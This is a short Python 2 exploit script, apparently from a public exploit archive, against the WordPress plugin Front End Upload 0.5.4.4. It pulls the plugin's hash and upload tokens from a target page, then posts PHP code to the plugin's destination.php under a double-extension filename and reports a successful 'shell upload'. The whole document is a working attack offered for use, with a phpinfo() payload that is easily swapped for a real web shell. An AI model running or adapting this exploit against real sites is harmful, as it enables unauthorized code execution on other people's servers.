#WordPress Plugin Front End Upload 0.5.4.4 - Arbitrary '.PHP' File Upload
#Author: nguyenlv7
import requests,re,sys,urlparse
print "Example: python up.py http://localhost/wordpress/?p=1"

#main_url = "http://localhost/wordpress/2018/07/18/hello-world/"
main_url = sys.argv[1]

proxy = {}
#proxy = {"http":"http://localhost:8080"}

hostname = urlparse.urljoin(main_url,"/")

html = requests.get(main_url,proxies= proxy).text
h = 'feuhash_(\w+)'
u = 'feuupload_(\w+)'
#login_form
_h_match = re.search(h,html)
_u_match = re.search(u,html)
#print html
if _h_match is None:
	print "Plugin not found!!!!!!!!"
	sys.exit(1)
_hash = _h_match.group(0)
_upload = _u_match.group(0)


print "hash is %s, up is %s" % (_hash,_upload)
url_post = hostname + "wordpress/wp-content/plugins/front-end-upload/destination.php?name=info.php.jpg"

print url_post

html2 = requests.post(url_post,proxies=proxy,data="<?php phpinfo();?>",headers={'hash': _hash,'feu': _upload,'referer': main_url}).text


if re.search('[a-f0-9]{32}',html2):
    print "=======> exploit success, shell upload at /wp-content/uploads/feu_{RANDOM-MD5}/info.php.jpg"
else:
    print "exploit fail"
